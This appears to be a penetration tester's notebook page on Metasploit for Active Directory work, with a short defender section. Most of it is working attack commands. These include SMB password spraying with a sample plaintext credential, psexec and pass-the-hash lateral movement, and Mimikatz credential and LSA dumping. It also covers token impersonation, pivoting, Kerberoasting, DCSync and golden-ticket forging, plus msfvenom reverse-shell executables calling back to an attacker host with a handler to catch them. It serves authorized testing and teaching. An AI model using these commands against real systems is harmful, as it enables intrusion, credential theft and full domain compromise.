# Metasploit Framework

Metasploit is an exploitation framework: reusable **modules** (`exploit/`, `auxiliary/`, `post/`, `payload/`), interactive **sessions** (Meterpreter), an integrated **credentials/loot database**, and built-in **pivoting**. This vault mostly does AD work with Impacket + NetExec + hashcat; reach for Metasploit when you want the integrated session/DB/pivot workflow, a specific module, or Meterpreter post-exploitation. Authorized engagements only.

Runs from your **Linux/Kali attack box**. Start the database so creds/loot/workspaces persist:

```bash
sudo msfdb init && msfconsole -q
```

## Contents

- [Console basics](#console-basics)
- [Validate & spray credentials over SMB](#validate--spray-credentials-over-smb)
- [Get a shell / lateral movement](#get-a-shell--lateral-movement)
- [Meterpreter essentials](#meterpreter-essentials)
- [Pivoting through a session](#pivoting-through-a-session)
- [AD / Domain Controller attacks](#ad--domain-controller-attacks)
- [Payload generation (msfvenom)](#payload-generation-msfvenom)
- [Detection / defense (for the report)](#detection--defense-for-the-report)
- [References](#references)

## Console basics

```text
search smb_login                       # find a module
use auxiliary/scanner/smb/smb_login    # select it
info                                   # what it does
options                                # required/optional settings
set RHOSTS 10.129.1.18                 # set for this module
setg LHOST 10.10.14.5                  # set globally (persists across modules)
run                                    # or 'exploit'
back                                   # leave the module

sessions -l ; sessions -i 1            # list / interact with sessions
creds ; loot ; hosts ; services        # the backing database
workspace -a client01                  # isolate an engagement's data
```

## Validate & spray credentials over SMB

`smb_login` confirms an account works and flags hosts where it's a **local admin** (`Admin!` in the output) — those are your psexec targets. Single account:

```text
use auxiliary/scanner/smb/smb_login
set RHOSTS 10.129.1.18
set SMBUser p.walsh
set SMBPass Aut0mn-Temp-P@ss!
set SMBDomain vellum
run
```

Spray a subnet with files instead of one login:

```text
set RHOSTS 10.129.1.0/24        # sweep a range
set USER_FILE users.txt
set PASS_FILE passwords.txt
set SMBDomain vellum
set BLANK_PASSWORDS false
set THREADS 10
run
```

> **Lockout discipline:** keep one password across many users (spray), not many passwords per user. See [Password Attacks & Brute Forcing](../Networking/Password%20Attacks%20%26%20Brute%20Forcing.md). One-liner equivalent: `nxc smb 10.129.1.18 -u p.walsh -p 'Aut0mn-Temp-P@ss!' -d vellum`.

## Get a shell / lateral movement

```text
# SMB exec as a local admin -> SYSTEM (creates a service; noisy)
use exploit/windows/smb/psexec
set RHOSTS 10.129.1.18
set SMBUser p.walsh
set SMBPass Aut0mn-Temp-P@ss!
set SMBDomain vellum
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
run

# Pass-the-hash: put the full LM:NT hash in SMBPass instead of a password
set SMBPass aad3b435b51404eeaad3b435b51404ee:<nt-hash>
```

```text
# Impacket-backed exec modules (quieter alternatives to psexec)
use auxiliary/scanner/smb/impacket/wmiexec     # WMI, no service
use auxiliary/scanner/smb/impacket/smbexec     # service-based, semi-interactive

# WinRM (5985/5986)
use auxiliary/scanner/winrm/winrm_login        # validate creds
use auxiliary/scanner/winrm/winrm_cmd          # run a command

# SSH (Linux targets)
use auxiliary/scanner/ssh/ssh_login            # yields a shell session on success
```

See [Remote Access & Getting a Shell](../Networking/Remote%20Access%20%26%20Getting%20a%20Shell.md) for the non-Metasploit equivalents (evil-winrm, xfreerdp, ssh).

## Meterpreter essentials

```text
sessions -i 1
background                 # keep the session, return to msf
sysinfo ; getuid ; getprivs
ps ; migrate <pid>         # move into a stabler/again-owned process
getsystem                  # local admin -> SYSTEM (token duplication)
hashdump                   # local SAM hashes
load kiwi ; creds_all ; lsa_dump_secrets           # Mimikatz: memory creds / LSA secrets
load incognito ; list_tokens -u ; impersonate_token 'VELLUM\\Administrator'
```

## Pivoting through a session

```text
run autoroute -s 10.10.20.0/24         # route msf modules through this session
use auxiliary/server/socks_proxy ; run # then send external tools via proxychains
portfwd add -l 3389 -p 3389 -r 10.10.20.5   # local forward to an internal host
```

Concept and SSH/chisel alternatives: [Networking Overview → Pivoting](../Networking/Networking%20Overview.md#pivoting--tunneling-turn-one-host-into-a-route).

## AD / Domain Controller attacks

Metasploit can drive the [full DC chain](../AD/Attacking%20the%20Domain%20Controller.md):

```text
# Kerberoasting -> hashes land in the creds DB
use auxiliary/gather/kerberoast            # native Ruby module
use auxiliary/gather/get_user_spns         # Impacket-backed alternative
use auxiliary/analyze/crack_windows        # crack DB hashes via hashcat, writes plaintext back
#   (AS-REP roasting: use Impacket GetNPUsers.py — see the DC note)

# DCSync — two ways
meterpreter > load kiwi
meterpreter > dcsync_ntlm VELLUM\krbtgt    # from a Domain Admin *user* token (not SYSTEM)
use auxiliary/scanner/smb/impacket/secretsdump   # remote, creds-only, no session (ACTION just-dc)

# Kerberos ticket forging / handling
use auxiliary/admin/kerberos/forge_ticket        # golden (krbtgt) / silver (service hash)
use auxiliary/admin/kerberos/ticket_converter    # kirbi <-> ccache
use auxiliary/admin/kerberos/inspect_ticket      # verify a forged/looted ticket
```

## Payload generation (msfvenom)

```bash
# Windows x64 reverse Meterpreter EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o s.exe

# Linux x64 ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=443 -f elf -o s.elf
```

```text
# Catch any of the above
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set LPORT 443
run
```

## Detection / defense (for the report)

- **psexec module:** service creation (**7045**), `ADMIN$` write, named-pipe activity — same signature as Impacket psexec.
- **smb_login spraying:** a burst of **4625** (with occasional **4624**) across many hosts; account lockout policy + alerting catches it.
- **Meterpreter:** frequently in-memory; watch for reverse_tcp beacons, `migrate`/`getsystem` token manipulation, and injected threads. EDR + Sysmon (process creation / image load / CreateRemoteThread) cover most.
- **DCSync / Kerberoast:** detections as in [Attacking the Domain Controller → Detection & defense](../AD/Attacking%20the%20Domain%20Controller.md#detection--defense-write-this-in-the-report) (4662 replication GUIDs; 4769 RC4 / 4768 no-preauth).

## References

- Cross-links: [Remote Access & Getting a Shell](../Networking/Remote%20Access%20%26%20Getting%20a%20Shell.md), [Impacket Toolkit](../AD/Impacket%20Toolkit.md), [Attacking the Domain Controller](../AD/Attacking%20the%20Domain%20Controller.md), [Password Attacks & Brute Forcing](../Networking/Password%20Attacks%20%26%20Brute%20Forcing.md).
- Rapid7 Metasploit documentation (Active Directory / Kerberos), Offensive Security "Metasploit Unleashed".
